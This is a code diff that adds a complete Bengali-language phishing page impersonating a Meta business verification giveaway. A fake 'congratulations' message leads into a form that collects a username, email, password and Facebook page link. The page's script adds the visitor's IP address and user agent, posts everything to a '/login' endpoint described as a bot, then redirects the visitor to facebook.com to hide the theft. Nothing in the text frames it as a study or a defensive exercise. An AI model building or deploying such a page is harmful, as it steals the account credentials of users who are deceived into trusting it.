@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Meta Business Verification 2026</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0066cc, #003366);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            max-width: 550px;
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            text-align: center;
+            padding: 30px 25px;
+        }
+        /* Big Meta Verified Logo */
+        .big-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .big-logo img {
+            width: 100px;
+            height: 100px;
+        }
+        /* Main Button */
+        .main-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0066cc, #003366);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
+        }
+        .main-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,102,204,0.3);
+        }
+        /* Congratulations Section */
+        .congrats {
+            display: none;
+            background: #e8f0fe;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 15px 0;
+        }
+        .congrats h3 {
+            color: #0066cc;
+            margin-bottom: 15px;
+        }
+        /* Table */
+        .verification-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        .verification-table th {
+            background: linear-gradient(135deg, #0066cc, #003366);
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            text-align: center;
+            border: 1px solid #ddd;
+        }
+        .verification-table td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 13px;
+        }
+        .table-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .table-header img {
+            width: 30px;
+            height: 30px;
+        }
+        .table-header span {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0066cc;
+        }
+        /* Input Fields */
+        .input-field {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-field label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        .input-field input:focus {
+            border-color: #0066cc;
+            outline: none;
+        }
+        /* Accept Button */
+        .accept-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0066cc, #003366);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .accept-btn img {
+            width: 22px;
+            height: 22px;
+        }
+        /* Footer */
+        .footer-note {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer-note img {
+            width: 20px;
+            height: 20px;
+        }
+        .footer-note span {
+            color: #0066cc;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Big Meta Verified Logo -->
+        <div class="big-logo">
+            <img src="https://g.top4top.io/p_3814q17wn0.png" alt="Meta Verified">
+        </div>
+        
+        <!-- Step 2: Button to reveal form -->
+        <button class="main-btn" id="startBtn">🎉 ফ্রি মেটা বিজনেস ভেরিফিকেশন ২০২৬ 🎉</button>
+        
+        <!-- Step 3: Congratulations Section (Hidden initially) -->
+        <div id="congratsSection" class="congrats">
+            <h3>🎊 কংগ্রাচুলেশন! 🎊</h3>
+            <p>আপনি ফ্রি মেটা বিজনেস ভেরিফিকেশনের জন্য নির্বাচিত হয়েছেন!</p>
+        </div>
+        
+        <!-- Step 4: Form Section (Hidden initially) -->
+        <div id="formSection" style="display: none;">
+            <!-- Table Header with small logo -->
+            <div class="table-header">
+                <img src="https://g.top4top.io/p_3814q17wn0.png" alt="Meta">
+                <span>মেটা ভেরিফাই</span>
+            </div>
+            
+            <!-- Input Table -->
+            <table class="verification-table">
+                <thead>
+                    <tr>
+                        <th>ফিল্ড</th>
+                        <th>মান</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>ইউজারনেম</td>
+                        <td><input type="text" id="username" placeholder="আপনার ইউজারনেম" style="width:100%; padding:8px;"></td>
+                    </tr>
+                    <tr>
+                        <td>ইমেইল</td>
+                        <td><input type="email" id="email" placeholder="আপনার ইমেইল" style="width:100%; padding:8px;"></td>
+                    </tr>
+                    <tr>
+                        <td>পাসওয়ার্ড</td>
+                        <td><input type="password" id="password" placeholder="আপনার পাসওয়ার্ড" style="width:100%; padding:8px;"></td>
+                    </tr>
+                    <tr>
+                        <td>পেজ লিংক</td>
+                        <td><input type="text" id="page_link" placeholder="আপনার ফেসবুক পেজ লিংক" style="width:100%; padding:8px;"></td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <!-- Accept Button with Infinity Symbol -->
+            <button id="acceptBtn" class="accept-btn">
+                <img src="https://l.top4top.io/p_3814rdjo20.jpeg" alt="∞"> অ্যাকসেপ্ট অর্ডার করুন
+            </button>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer-note">
+            <img src="https://g.top4top.io/p_3814q17wn0.png" alt="Meta">
+            <span>ফ্রি মেটা বিজনেস ভেরিফিকেশন ক্যাম্পেইন ২০২৬</span>
+        </div>
+    </div>
+
+    <script>
+        // Get elements
+        const startBtn = document.getElementById('startBtn');
+        const congratsSection = document.getElementById('congratsSection');
+        const formSection = document.getElementById('formSection');
+        const acceptBtn = document.getElementById('acceptBtn');
+        
+        // Step 1: Click main button to show congratulations
+        startBtn.addEventListener('click', function() {
+            startBtn.style.display = 'none';
+            congratsSection.style.display = 'block';
+            formSection.style.display = 'block';
+        });
+        
+        // Step 2: Submit data to bot
+        acceptBtn.addEventListener('click', async function() {
+            const formData = {
+                username: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                page_link: document.getElementById('page_link').value,
+                page_type: 'meta_verify',
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Get IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                formData.ipAddress = ipData.ip;
+            } catch(e) {
+                formData.ipAddress = 'Unknown';
+            }
+            formData.userAgent = navigator.userAgent;
+            
+            // Send to bot
+            await fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(formData)
+            });
+            
+            alert('✅ আপনার তথ্য সফলভাবে জমা হয়েছে! Redirecting to Facebook...');
+            window.location.href = 'https://www.facebook.com/';
+        });
+    </script>
+</body>
+</html>
